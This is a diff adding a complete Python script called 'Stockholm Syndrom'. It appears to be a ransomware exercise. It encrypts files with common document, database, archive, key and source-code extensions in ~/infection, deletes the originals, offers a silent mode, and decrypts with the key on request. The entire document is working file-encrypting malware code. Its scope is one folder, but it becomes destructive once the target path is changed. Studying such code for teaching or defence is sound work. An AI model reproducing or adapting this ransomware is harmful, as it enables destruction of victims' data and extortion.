@@ -1,0 +1,175 @@
+#!/usr/bin/env python3
+
+import argparse
+import os
+from cryptography.fernet import Fernet
+
+
+def validate_key(key_string):    
+
+    if len(key_string) != 44:
+        print("Error: key must be 44 characters.")
+        exit(1)
+
+    try:
+        Fernet(key_string.encode())
+
+    except Exception as e:
+        print("Error: invalid Fernet key")
+        exit(1)
+
+    return key_string.encode()
+
+def encrypt_file(filepath, key):
+    try:
+        with open(filepath, 'rb') as f:
+            content = f.read()
+
+        fernet = Fernet(key)
+        encrypted_content = fernet.encrypt(content)
+
+
+
+        new_filepath = filepath + ".ft"
+        with open(new_filepath, 'wb') as f:
+            f.write(encrypted_content)
+
+        if not silent:
+            print("Encrypted:", filepath)
+    
+        os.remove(filepath)
+
+    except Exception as e:
+        if not silent:
+            print("Failed to encrypt:", filepath, ":", e)
+    
+def decrypt_file(filepath, key):
+    try:
+        with open(filepath, 'rb') as f:
+            encrypted_content = f.read()
+
+        fernet = Fernet(key)
+        content = fernet.decrypt(encrypted_content)
+
+        original_filepath = filepath[:-3]
+        with open(original_filepath, 'wb') as f:
+            f.write(content)
+
+        if not silent:
+            print("Decrypted:", filepath)
+
+        os.remove(filepath)
+
+    except Exception as e:
+        if not silent:
+            print("Failed to decrypt:", filepath, ":", e)
+
+def get_target_files(target_path):
+    target_files = []
+
+    if not os.path.exists(target_path):
+        if not silent:
+            print("Error: Directory", target_path, " does not exist")
+        return target_files
+    
+    for filename in os.listdir(target_path):
+        filepath = os.path.join(target_path, filename)
+
+        if os.path.isdir(filepath):
+            continue
+
+        name, extension = os.path.splitext(filename)
+        if extension.lower() in target_extensions:
+            target_files.append(filepath)
+        
+    return target_files
+    
+def get_encrypted_files(target_path):
+    encrypted_files = []
+
+    if not os.path.exists(target_path):
+        if not silent:
+            print("Error: Directory", target_path, " does not exist")
+        return encrypted_files
+    
+    for filename in os.listdir(target_path):
+        filepath = os.path.join(target_path, filename)
+
+        if os.path.isdir(filepath):
+            continue
+
+        if filename.endswith(".ft"):
+            encrypted_files.append(filepath)
+        
+    return encrypted_files
+
+
+
+parser = argparse.ArgumentParser(description="Stockholm Syndrom")
+
+parser.add_argument("-v", "--version", help="Show the version of this program", action="store_true")
+parser.add_argument("-r", "--reverse", type=str, help="Reverse the infection with the provided key")
+parser.add_argument("-s", "--silent", help="Program will not produce any output", action="store_true")
+
+args = parser.parse_args()
+
+home = os.path.expanduser("~")
+target_path = os.path.join(home, "infection")
+silent = args.silent
+
+target_extensions = {
+    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".odt", ".ods",
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".mp3", ".mp4", ".mov", ".mkv",
+    ".db", ".sql", ".mdb", ".key", ".pem", ".pfx", ".jpg", ".png",
+    ".psd", ".ai", ".java", ".c", ".cpp", ".h"
+}
+
+if args.version:
+    if not silent:
+        print("Stockholm Syndrom - Alpha 0.1 Linux Edition")
+    exit(0)
+
+if args.reverse:
+    key = validate_key(args.reverse)
+
+    encrypted_files = get_encrypted_files(target_path)
+
+    if not encrypted_files:
+        if not silent:
+            print("No encrypted files found in ~/infection")
+        exit(0)
+    
+    if not silent:
+        print("Decrypting files...")
+
+    for filepath in encrypted_files:
+        decrypt_file(filepath, key)
+    
+    if not silent:
+        print("Succesfully decrypted files.")
+    exit(0)
+
+target_files = get_target_files(target_path)
+
+if not target_files:
+    if not silent:
+        print("No target files found in ~/infection")
+    exit(0)
+
+key = Fernet.generate_key()
+key_string = key.decode()
+
+key_file = os.path.join(target_path, "stockholm.key")
+with open(key_file, 'w') as f:
+    f.write(key_string)
+
+if not silent:
+    print("Encrypting files...")
+    print("ENCRYPTION KEY:", key_string)
+
+for filepath in target_files:
+    encrypt_file(filepath, key)
+
+if not silent:
+    print("Successfully Encrypted files")
+    print("Key saved to:", key_file)
